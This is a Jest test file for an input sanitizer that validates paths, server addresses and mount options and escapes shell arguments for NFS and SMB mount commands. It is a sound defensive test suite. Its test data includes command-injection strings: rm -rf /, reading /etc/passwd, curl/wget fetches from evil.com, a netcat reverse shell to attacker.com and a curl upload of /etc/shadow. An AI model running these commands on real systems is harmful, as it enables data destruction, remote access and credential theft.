import {
  escapeShellArg,
  sanitizeMountOptions,
  sanitizePath,
  sanitizeServerAddress,
} from '../input-sanitizer';

describe('Input Sanitizer', () => {
  describe('sanitizePath', () => {
    describe('valid paths', () => {
      const validPaths = [
        '/mnt/user/media',
        '/var/lib/bitbonsai',
        '/home/user/documents',
        '/media',
        '/tmp/test-123',
        '/path/with-dashes',
        '/path/with_underscores',
        '/path/with.dots',
        '/path123/with456/numbers789',
      ];

      validPaths.forEach((path) => {
        it(`should accept valid path: ${path}`, () => {
          expect(() => sanitizePath(path)).not.toThrow();
          expect(sanitizePath(path)).toBe(path);
        });
      });
    });

    describe('invalid paths - dangerous characters', () => {
      const dangerousChars = [
        { char: ';', path: '/mnt/user;rm -rf /' },
        { char: '&', path: '/mnt/user&& whoami' },
        { char: '|', path: '/mnt/user | cat /etc/passwd' },
        { char: '`', path: '/mnt/user`whoami`' },
        { char: '$', path: '/mnt/user$(whoami)' },
        { char: '(', path: '/mnt/user(test)' },
        { char: ')', path: '/mnt/user)' },
        { char: '<', path: '/mnt/user<file' },
        { char: '>', path: '/mnt/user>file' },
        { char: "'", path: "/mnt/user'test'" },
        { char: '"', path: '/mnt/user"test"' },
        { char: '\\', path: '/mnt/user\\test' },
        { char: '!', path: '/mnt/user!test' },
        { char: '{', path: '/mnt/user{test}' },
        { char: '}', path: '/mnt/user}' },
        { char: '[', path: '/mnt/user[test]' },
        { char: ']', path: '/mnt/user]' },
        { char: '*', path: '/mnt/user/*' },
        { char: '?', path: '/mnt/user/?' },
        { char: '~', path: '/mnt/user/~' },
      ];

      dangerousChars.forEach(({ char, path }) => {
        it(`should reject path with dangerous character '${char}': ${path}`, () => {
          expect(() => sanitizePath(path)).toThrow(/Path contains dangerous characters/);
        });
      });
    });

    describe('invalid paths - path traversal', () => {
      const traversalPaths = [
        '/mnt/user/../etc/passwd',
        '/mnt/../../../root',
        '/var/lib/../../../etc/shadow',
        '/../etc/passwd',
        '/home/user/../../',
      ];

      traversalPaths.forEach((path) => {
        it(`should reject path traversal: ${path}`, () => {
          expect(() => sanitizePath(path)).toThrow(/Path traversal \(\.\.\) is not allowed/);
        });
      });
    });

    describe('invalid paths - relative paths', () => {
      const relativePaths = ['mnt/user/media', 'relative/path', './current/path', '../parent/path'];

      relativePaths.forEach((path) => {
        it(`should reject relative path: ${path}`, () => {
          expect(() => sanitizePath(path)).toThrow(/Path must be absolute \(start with \/\)/);
        });
      });
    });

    describe('edge cases', () => {
      it('should reject empty path', () => {
        expect(() => sanitizePath('')).toThrow(/Path cannot be empty/);
      });

      it('should reject null path', () => {
        expect(() => sanitizePath(null as any)).toThrow(/Path cannot be empty/);
      });

      it('should reject undefined path', () => {
        expect(() => sanitizePath(undefined as any)).toThrow(/Path cannot be empty/);
      });

      it('should accept root path', () => {
        expect(() => sanitizePath('/')).not.toThrow();
        expect(sanitizePath('/')).toBe('/');
      });
    });
  });

  describe('sanitizeServerAddress', () => {
    describe('valid IPv4 addresses', () => {
      const validIPv4 = [
        '192.168.1.1',
        '10.0.0.1',
        '172.16.0.1',
        '8.8.8.8',
        '255.255.255.255',
        '0.0.0.0',
        '127.0.0.1',
      ];

      validIPv4.forEach((ip) => {
        it(`should accept valid IPv4: ${ip}`, () => {
          expect(() => sanitizeServerAddress(ip)).not.toThrow();
          expect(sanitizeServerAddress(ip)).toBe(ip);
        });
      });
    });

    describe('invalid IPv4 addresses', () => {
      const invalidIPv4 = [
        { ip: '256.1.1.1', reason: 'octet > 255' },
        { ip: '192.168.1.256', reason: 'octet > 255' },
        { ip: '999.999.999.999', reason: 'all octets > 255' },
      ];

      invalidIPv4.forEach(({ ip, reason }) => {
        it(`should reject invalid IPv4 (${reason}): ${ip}`, () => {
          expect(() => sanitizeServerAddress(ip)).toThrow(/Invalid/);
        });
      });
    });

    describe('valid hostnames', () => {
      const validHostnames = [
        'localhost',
        'server',
        'my-server',
        'server.local',
        'nas.home.local',
        'server123',
        'web-server-01',
        'api.example.com',
        'sub.domain.example.com',
      ];

      validHostnames.forEach((hostname) => {
        it(`should accept valid hostname: ${hostname}`, () => {
          expect(() => sanitizeServerAddress(hostname)).not.toThrow();
          expect(sanitizeServerAddress(hostname)).toBe(hostname);
        });
      });
    });

    describe('invalid hostnames', () => {
      const invalidHostnames = [
        '-invalid',
        'invalid-',
        '.invalid',
        'invalid.',
        'in valid',
        'in@valid',
        'in#valid',
        'in$valid',
        'server;rm -rf /',
        'server|whoami',
        'server`whoami`',
        'server$(whoami)',
      ];

      invalidHostnames.forEach((hostname) => {
        it(`should reject invalid hostname: ${hostname}`, () => {
          expect(() => sanitizeServerAddress(hostname)).toThrow(/Invalid server address/);
        });
      });
    });

    describe('edge cases', () => {
      it('should reject empty address', () => {
        expect(() => sanitizeServerAddress('')).toThrow(/Server address cannot be empty/);
      });

      it('should reject null address', () => {
        expect(() => sanitizeServerAddress(null as any)).toThrow(/Server address cannot be empty/);
      });

      it('should reject undefined address', () => {
        expect(() => sanitizeServerAddress(undefined as any)).toThrow(
          /Server address cannot be empty/
        );
      });
    });
  });

  describe('sanitizeMountOptions', () => {
    describe('valid mount options', () => {
      const validOptions = [
        'ro',
        'rw',
        'nolock',
        'soft',
        'hard',
        'async',
        'sync',
        'noatime',
        'nodiratime',
        'vers=3.0',
        'vers=4.1',
        'nfsvers=3',
        'nfsvers=4.2',
        'uid=1000',
        'gid=1000',
        'timeo=600',
        'retrans=2',
        'port=2049',
        'credentials=/etc/bitbonsai/creds',
        'domain=WORKGROUP',
      ];

      validOptions.forEach((option) => {
        it(`should accept valid option: ${option}`, () => {
          expect(() => sanitizeMountOptions(option)).not.toThrow();
          expect(sanitizeMountOptions(option)).toBe(option);
        });
      });

      it('should accept comma-separated options', () => {
        const options = 'ro,nolock,soft';
        expect(() => sanitizeMountOptions(options)).not.toThrow();
        expect(sanitizeMountOptions(options)).toBe(options);
      });

      it('should accept complex option combination', () => {
        const options = 'ro,nolock,soft,vers=3.0,uid=1000,gid=1000,timeo=600';
        expect(() => sanitizeMountOptions(options)).not.toThrow();
        expect(sanitizeMountOptions(options)).toBe(options);
      });

      it('should handle whitespace in comma-separated options', () => {
        const options = 'ro, nolock, soft';
        expect(() => sanitizeMountOptions(options)).not.toThrow();
      });
    });

    describe('invalid mount options', () => {
      const invalidOptions = [
        { option: 'exec', reason: 'not whitelisted' },
        { option: 'suid', reason: 'security risk' },
        { option: 'dev', reason: 'security risk' },
        { option: 'arbitrary=value', reason: 'not whitelisted' },
        { option: 'ro;rm -rf /', reason: 'command injection' },
        { option: 'rw|whoami', reason: 'command injection' },
        { option: 'soft`whoami`', reason: 'command injection' },
        { option: 'hard$(whoami)', reason: 'command injection' },
      ];

      invalidOptions.forEach(({ option, reason }) => {
        it(`should reject invalid option (${reason}): ${option}`, () => {
          expect(() => sanitizeMountOptions(option)).toThrow(/Mount option .* is not allowed/);
        });
      });

      it('should reject if one option in list is invalid', () => {
        expect(() => sanitizeMountOptions('ro,nolock,exec')).toThrow(
          /Mount option "exec" is not allowed/
        );
      });
    });

    describe('edge cases', () => {
      it('should handle empty string', () => {
        expect(() => sanitizeMountOptions('')).not.toThrow();
        expect(sanitizeMountOptions('')).toBe('');
      });

      it('should handle null', () => {
        expect(() => sanitizeMountOptions(null as any)).not.toThrow();
        expect(sanitizeMountOptions(null as any)).toBe('');
      });

      it('should handle undefined', () => {
        expect(() => sanitizeMountOptions(undefined as any)).not.toThrow();
        expect(sanitizeMountOptions(undefined as any)).toBe('');
      });

      it('should ignore empty elements in comma-separated list', () => {
        const options = 'ro,,nolock,';
        expect(() => sanitizeMountOptions(options)).not.toThrow();
      });
    });
  });

  describe('escapeShellArg', () => {
    describe('basic escaping', () => {
      it('should wrap simple string in single quotes', () => {
        const result = escapeShellArg('simple');
        expect(result).toBe("'simple'");
      });

      it('should escape single quotes', () => {
        const result = escapeShellArg("it's");
        expect(result).toBe("'it'\\''s'");
      });

      it('should handle multiple single quotes', () => {
        const result = escapeShellArg("it's a 'test'");
        expect(result).toBe("'it'\\''s a '\\''test'\\'''");
      });
    });

    describe('special characters protection', () => {
      const specialChars = [
        { input: 'test;rm -rf /', desc: 'semicolon' },
        { input: 'test && whoami', desc: 'ampersand' },
        { input: 'test | cat /etc/passwd', desc: 'pipe' },
        { input: 'test`whoami`', desc: 'backticks' },
        { input: 'test$(whoami)', desc: 'command substitution' },
        { input: 'test<file', desc: 'redirect input' },
        { input: 'test>file', desc: 'redirect output' },
        { input: 'test*', desc: 'wildcard' },
        { input: 'test?', desc: 'wildcard single' },
        { input: 'test[a-z]', desc: 'bracket expansion' },
        { input: 'test{a,b}', desc: 'brace expansion' },
        { input: 'test\\escape', desc: 'backslash' },
        { input: 'test"quotes"', desc: 'double quotes' },
        { input: 'test!history', desc: 'history expansion' },
        { input: 'test~user', desc: 'tilde expansion' },
        { input: 'test$VAR', desc: 'variable expansion' },
      ];

      specialChars.forEach(({ input, desc }) => {
        it(`should safely escape ${desc}: ${input}`, () => {
          const escaped = escapeShellArg(input);
          expect(escaped).toContain("'");
          expect(escaped.startsWith("'")).toBe(true);
          expect(escaped.endsWith("'")).toBe(true);
        });
      });
    });

    describe('edge cases', () => {
      it('should handle empty string', () => {
        const result = escapeShellArg('');
        expect(result).toBe("''");
      });

      it('should handle null', () => {
        const result = escapeShellArg(null as any);
        expect(result).toBe("''");
      });

      it('should handle undefined', () => {
        const result = escapeShellArg(undefined as any);
        expect(result).toBe("''");
      });

      it('should handle string with only single quotes', () => {
        const result = escapeShellArg("'''");
        expect(result).toBe("''\\'''\\'''\\'''");
      });

      it('should handle whitespace', () => {
        const result = escapeShellArg('test with spaces');
        expect(result).toBe("'test with spaces'");
      });

      it('should handle tabs and newlines', () => {
        const result = escapeShellArg('test\twith\ntabs');
        expect(result).toBe("'test\twith\ntabs'");
      });

      it('should handle unicode characters', () => {
        const result = escapeShellArg('тест🔐');
        expect(result).toBe("'тест🔐'");
      });
    });

    describe('mount command safety', () => {
      it('should safely escape NFS export path', () => {
        const exportPath = "192.168.1.100:/mnt/user's media";
        const escaped = escapeShellArg(exportPath);

        expect(escaped).not.toContain('&&');
        expect(escaped).not.toContain(';');
        expect(escaped).not.toContain('|');
      });

      it('should safely escape SMB UNC path', () => {
        const uncPath = "//server/share's folder";
        const escaped = escapeShellArg(uncPath);

        expect(escaped).not.toContain('&&');
        expect(escaped).not.toContain(';');
        expect(escaped).not.toContain('|');
      });

      it('should safely escape mount point with special chars', () => {
        const mountPoint = "/mnt/user's storage";
        const escaped = escapeShellArg(mountPoint);

        expect(escaped).not.toContain('&&');
        expect(escaped).not.toContain(';');
        expect(escaped).not.toContain('|');
      });
    });

    describe('command injection prevention', () => {
      const injectionAttempts = [
        '; rm -rf /',
        '&& whoami',
        '| cat /etc/passwd',
        '` whoami `',
        '$( whoami )',
        '; curl evil.com | sh',
        '&& wget evil.com/backdoor.sh',
      ];

      injectionAttempts.forEach((attempt) => {
        it(`should prevent command injection: ${attempt}`, () => {
          const escaped = escapeShellArg(`/mnt/user${attempt}`);

          // After escaping, the string should be wrapped in single quotes
          // and any single quotes inside should be escaped
          expect(escaped.startsWith("'")).toBe(true);
          expect(escaped.endsWith("'")).toBe(true);

          // The dangerous characters should be inside the quotes
          // and thus neutralized
          // The dangerous input should be wrapped in single quotes, making it safe
          expect(escaped).toMatch(/^'/);
          expect(escaped).toMatch(/'$/);
          // Any internal single quotes should be escaped
          const inner = escaped.slice(1, -1);
          expect(inner).not.toMatch(/(?<!\\)'/); // No unescaped single quotes inside
        });
      });
    });
  });

  describe('integration scenarios', () => {
    describe('NFS mount command building', () => {
      it('should safely build NFS mount command', () => {
        const serverAddress = sanitizeServerAddress('192.168.1.100');
        const sharePath = sanitizePath('/mnt/user/media');
        const mountPoint = sanitizePath('/media/nfs');
        const options = sanitizeMountOptions('ro,nolock,soft');

        const exportPath = `${serverAddress}:${sharePath}`;
        const command = `mount -t nfs -o ${options} ${escapeShellArg(
          exportPath
        )} ${escapeShellArg(mountPoint)}`;

        expect(command).toBe(
          "mount -t nfs -o ro,nolock,soft '192.168.1.100:/mnt/user/media' '/media/nfs'"
        );
      });

      it('should reject NFS mount with injection attempt', () => {
        expect(() => sanitizeServerAddress('192.168.1.100; rm -rf /')).toThrow();
        expect(() => sanitizePath('/mnt/user/media; whoami')).toThrow();
        expect(() => sanitizeMountOptions('ro,nolock,soft; curl evil.com')).toThrow();
      });
    });

    describe('SMB mount command building', () => {
      it('should safely build SMB mount command', () => {
        const serverAddress = sanitizeServerAddress('nas.local');
        const sharePath = 'media'; // SMB shares don't use sanitizePath
        const mountPoint = sanitizePath('/media/smb');
        const options = sanitizeMountOptions('credentials=/etc/bitbonsai/creds,vers=3.0');

        const uncPath = `//${serverAddress}/${sharePath}`;
        const command = `mount -t cifs -o ${options} ${escapeShellArg(
          uncPath
        )} ${escapeShellArg(mountPoint)}`;

        expect(command).toContain('mount -t cifs');
        expect(command).toContain('credentials=/etc/bitbonsai/creds');
        expect(command).toContain("'//nas.local/media'");
        expect(command).toContain("'/media/smb'");
      });
    });

    describe('real-world attack vectors', () => {
      it('should prevent path traversal to /etc/passwd', () => {
        expect(() => sanitizePath('/mnt/user/../../../../etc/passwd')).toThrow(/Path traversal/);
      });

      it('should prevent command injection via server address', () => {
        expect(() =>
          sanitizeServerAddress('192.168.1.100`nc -e /bin/sh attacker.com 1234`')
        ).toThrow(/Invalid server address/);
      });

      it('should prevent privilege escalation via mount options', () => {
        expect(() => sanitizeMountOptions('ro,suid,dev')).toThrow(/not allowed/);
      });

      it('should prevent data exfiltration via export path', () => {
        const maliciousPath = '192.168.1.100:/data; curl -X POST -d @/etc/shadow attacker.com';
        const parts = maliciousPath.split(':');

        // Server part should fail
        expect(() => sanitizeServerAddress(parts[0])).not.toThrow();

        // Path part should fail
        expect(() => sanitizePath(parts[1])).toThrow(/dangerous characters/);
      });
    });
  });
});
